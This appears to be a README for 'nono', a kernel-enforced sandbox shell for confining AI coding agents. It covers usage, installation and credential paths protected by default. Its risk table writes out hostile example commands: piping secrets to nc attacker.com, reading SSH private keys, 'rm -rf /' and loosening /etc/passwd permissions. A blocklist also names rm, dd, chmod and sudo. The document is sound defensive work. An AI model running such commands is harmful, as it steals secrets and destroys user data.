    No to unauthorized filesystem access. No to secret exfiltration. No to destructive commands.

    nono is a capability-based security shell that uses kernel-level primitives to sandbox AI agents. Once restrictions are applied, there’s no API to escape—not even for nono itself.

    The Problem: AI Agents Have Shell Access

    AI coding agents like Claude Code run shell commands. That’s powerful—and dangerous.

    Risk Example
    Data exfiltration curl secrets.txt \| nc attacker.com
    Credential theft cat ~/.ssh/id_rsa
    Destructive commands rm -rf /
    Config tampering chmod 777 /etc/passwd

    Policy-based filtering can be bypassed. You need structural enforcement.

    nono: Structural Impossibility

    nono doesn’t filter operations—it makes unauthorized operations structurally impossible at the kernel level.

    # Give Claude Code access only to current directory
nono run --allow . -- claude

# Separate read and write permissions
nono run --allow ./project --write ./output -- claude

# Block network entirely
nono run --allow . --net-block -- my-agent

    Once inside nono, there is no mechanism to bypass restrictions. The kernel denies unauthorized operations.

    Defense in Depth

    ┌─────────────────────────────────────┐
│  1. Command Blocklist               │  rm, dd, chmod, sudo blocked
├─────────────────────────────────────┤
│  2. Kernel Delete Enforcement       │  unlink/rmdir syscalls blocked
├─────────────────────────────────────┤
│  3. Kernel Truncate Protection      │  File zeroing prevented
├─────────────────────────────────────┤
│  4. Filesystem Sandbox              │  Path access via allowlists
├─────────────────────────────────────┤
│  5. Network Isolation               │  Network blocked when enabled
└─────────────────────────────────────┘

    No Escape Hatch

    The agent cannot request more permissions because the mechanism doesn’t exist. Child processes inherit all restrictions.

    Why Not Containers?

    Approach Overhead Setup
    Docker/Podman Images, layers, runtime Volume mounts, networking
    VMs Full OS Significant resources
    nono None Single command

    nono applies kernel-enforced restrictions directly to a process. No images, no volumes, no runtime.

    Installation

    # macOS (Homebrew)
brew tap lukehinds/nono
brew install nono

# From source (requires Rust)
git clone https://github.com/lukehinds/nono.git
cd nono
cargo build --release

    Usage Examples

    Basic Sandboxing

    # Read-only access to project
nono run --allow ./src -- cat src/main.rs

# Read/write to specific directory
nono run --allow . --write ./output -- python build.py

# Preview without executing
nono run --allow . --dry-run -- claude

    AI Agent Workflows

    # Claude Code with project access
nono run --allow ./my-project -- claude

# GPT wrapper with network blocked
nono run --allow . --net-block -- gpt-cli

# Any agent, any tool
nono run --allow ./workspace -- opencode

    Debugging

    # Why was this path blocked?
nono why /etc/passwd

    Sensitive Paths Protected by Default

    nono blocks access to sensitive paths automatically:

    • ~/.ssh/ - SSH keys
    • ~/.aws/ - AWS credentials
    • ~/.bashrc, ~/.zshrc - Shell configs
    • ~/.gnupg/ - GPG keys

    Your secrets stay secret.

    Rust Wrapper Potential

    nono is written in Rust. This makes it an excellent candidate for:

    • RLM integration - Wrap nono as a Rust library for programmatic sandboxing
    • Custom agent runtimes - Embed capability-based security in Rust agents
    • Build system integration - Sandbox untrusted build steps
    // Hypothetical Rust wrapper
use nono::{Sandbox, Capability};

let sandbox = Sandbox::new()
    .allow_read("./src")
    .allow_write("./output")
    .block_network()
    .build()?;

sandbox.run("cargo build")?;

    Key Takeaways

    1. Kernel enforcement beats policy filtering. Structural impossibility > detection and blocking.

    2. Capability-based security works. Grant explicit capabilities, deny everything else.

    3. Lightweight beats heavyweight. No containers, no VMs, just kernel primitives.

    4. AI agents need sandboxing. Shell access is powerful—and dangerous.
